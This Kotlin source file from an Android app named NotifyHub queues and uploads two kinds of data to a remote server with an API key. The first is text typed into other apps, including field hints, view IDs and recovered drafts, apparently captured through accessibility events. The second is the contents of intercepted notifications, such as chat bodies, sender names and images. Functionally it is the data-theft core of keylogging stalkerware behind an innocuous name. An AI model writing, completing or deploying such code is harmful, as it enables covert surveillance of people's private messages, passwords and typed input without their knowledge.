package com.notifyhub

import android.content.Context
import com.notifyhub.data.PendingNotification
import com.notifyhub.data.PendingTypedText
import com.notifyhub.data.TypedTextDraft
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

object NotificationSender {

    private const val BATCH_SIZE = 10
    private const val BATCH_DELAY_MS = 120L
    private const val BASE_RETRY_MS = 5_000L
    private const val MAX_RETRY_MS = 15 * 60 * 1000L

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val draining = AtomicBoolean(false)

    fun enqueueNotification(context: Context, payload: PendingNotification, imageData: String? = null) {
        val item = if (imageData != null) payload.copy(imageData = imageData) else payload
        runBlocking(Dispatchers.IO) {
            App.database.dao().insert(item)
        }
        kick(context)
    }

    fun enqueueTypedText(
        context: Context,
        deviceId: String,
        packageName: String,
        appLabel: String,
        targetName: String,
        text: String,
        capturedAt: String,
        rawPackage: String = packageName,
        rawAppLabel: String = appLabel,
        resolvedPackage: String? = null,
        resolvedAppLabel: String? = null,
        attributionSource: String? = null,
        attributionConfidence: Double = 0.0,
        targetSource: String? = null,
        className: String? = null,
        viewId: String? = null,
        hintText: String? = null,
        contentDescription: String? = null,
        inputType: Int? = null,
        eventType: Int? = null
    ) {
        val item = PendingTypedText(
            deviceId = deviceId,
            packageName = packageName,
            appLabel = appLabel,
            targetName = targetName,
            text = text,
            capturedAt = capturedAt,
            rawPackage = rawPackage,
            rawAppLabel = rawAppLabel,
            resolvedPackage = resolvedPackage,
            resolvedAppLabel = resolvedAppLabel,
            attributionSource = attributionSource,
            attributionConfidence = attributionConfidence,
            targetSource = targetSource,
            className = className,
            viewId = viewId,
            hintText = hintText,
            contentDescription = contentDescription,
            inputType = inputType,
            eventType = eventType
        )
        runBlocking(Dispatchers.IO) {
            App.database.dao().insertText(item)
        }
        kick(context)
    }

    fun saveTypedDraft(draft: TypedTextDraft) {
        runBlocking(Dispatchers.IO) {
            App.database.dao().upsertTypedDraft(draft)
        }
    }

    fun deleteTypedDraft(sessionKey: String) {
        runBlocking(Dispatchers.IO) {
            App.database.dao().deleteTypedDraft(sessionKey)
        }
    }

    suspend fun flushTypedDrafts(context: Context, activeSessionKeys: Set<String>) {
        val dao = App.database.dao()
        for (draft in dao.getTypedDrafts()) {
            if (draft.sessionKey in activeSessionKeys) continue
            enqueueTypedText(
                context = context,
                deviceId = draft.deviceId,
                packageName = draft.packageName,
                appLabel = draft.appLabel,
                targetName = draft.targetName,
                text = draft.text,
                capturedAt = java.time.Instant.ofEpochMilli(draft.firstSeenAt).toString(),
                rawPackage = draft.packageName,
                rawAppLabel = draft.appLabel,
                resolvedPackage = draft.packageName,
                resolvedAppLabel = draft.appLabel,
                attributionSource = "accessibility_draft_recovery",
                attributionConfidence = 0.5,
                targetSource = if (draft.targetName.isBlank()) null else "accessibility_context",
                className = draft.className,
                viewId = draft.viewId,
                hintText = draft.hintText,
                contentDescription = draft.contentDescription,
                inputType = draft.inputType,
                eventType = draft.eventType
            )
            runBlocking(Dispatchers.IO) {
                dao.deleteTypedDraft(draft.sessionKey)
            }
        }
    }

    fun kick(context: Context) {
        val appContext = context.applicationContext
        scope.launch {
            drainQueue(appContext)
            MediaUploader.drainQueue(appContext)
        }
    }

    suspend fun drainQueue(context: Context) {
        if (!draining.compareAndSet(false, true)) return
        try {
            if (!NetworkState.hasNetwork(context)) return
            val dao = App.database.dao()
            val now = System.currentTimeMillis()

            for (item in dao.getPending(now, BATCH_SIZE)) {
                if (!NetworkState.hasNetwork(context)) break
                if (post(item)) {
                    dao.delete(item.id)
                } else {
                    dao.markAttempt(item.id, now + retryDelay(item.attempts))
                }
                delay(BATCH_DELAY_MS)
            }

            for (item in dao.getPendingText(now, BATCH_SIZE)) {
                if (!NetworkState.hasNetwork(context)) break
                if (postTypedText(item)) {
                    dao.deleteText(item.id)
                } else {
                    dao.markAttemptText(item.id, now + retryDelay(item.attempts))
                }
                delay(BATCH_DELAY_MS)
            }
        } finally {
            draining.set(false)
        }
    }

    private fun retryDelay(attempts: Int): Long {
        val shift = attempts.coerceIn(0, 12)
        return minOf(MAX_RETRY_MS, BASE_RETRY_MS shl shift)
    }

    private fun postTypedText(item: PendingTypedText): Boolean {
        return try {
            val json = JSONObject().apply {
                put("deviceId", item.deviceId)
                put("packageName", item.packageName)
                put("appLabel", item.appLabel)
                put("targetName", item.targetName)
                put("text", item.text)
                put("capturedAt", item.capturedAt)
                put("appRole", AppStatusReporter.ROLE)
                put("rawPackage", item.rawPackage)
                put("rawAppLabel", item.rawAppLabel)
                put("attributionConfidence", item.attributionConfidence)
                item.resolvedPackage?.let { put("resolvedPackage", it) }
                item.resolvedAppLabel?.let { put("resolvedAppLabel", it) }
                item.attributionSource?.let { put("attributionSource", it) }
                item.targetSource?.let { put("targetSource", it) }
                item.className?.let { put("className", it) }
                item.viewId?.let { put("viewId", it) }
                item.hintText?.let { put("hintText", it) }
                item.contentDescription?.let { put("contentDescription", it) }
                item.inputType?.let { put("inputType", it) }
                item.eventType?.let { put("eventType", it) }
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/typed-text")
                .header("X-API-Key", BuildConfig.API_KEY)
                .post(body)
                .build()
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun post(payload: PendingNotification): Boolean {
        return try {
            val json = JSONObject().apply {
                put("deviceId", payload.deviceId)
                put("packageName", payload.packageName)
                put("appLabel", payload.appLabel)
                put("postedAt", payload.postedAt)
                put("dedupHash", payload.dedupHash)
                put("appRole", AppStatusReporter.ROLE)
                put("photoIntent", payload.photoIntent)
                put("flags", payload.flags)
                put("title", payload.title)
                put("textBody", payload.textBody)
                put("bigText", payload.bigText)
                put("subText", payload.subText)
                payload.senderName?.let { put("senderName", it) }
                payload.chatBody?.let { put("chatBody", it) }
                payload.imageData?.let { put("imageData", it) }
                payload.imageSource?.let { put("imageSource", it) }
                payload.notificationKey?.let { put("notificationKey", it) }
                payload.channelId?.let { put("channelId", it) }
                payload.category?.let { put("category", it) }
                payload.groupKey?.let { put("groupKey", it) }
                payload.sortKey?.let { put("sortKey", it) }
                payload.conversationTitle?.let { put("conversationTitle", it) }
                payload.extrasJson?.let { put("extrasJson", it) }
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/notifications")
                .header("X-API-Key", BuildConfig.API_KEY)
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                response.isSuccessful || response.code == 409
            }
        } catch (_: Exception) {
            false
        }
    }
}
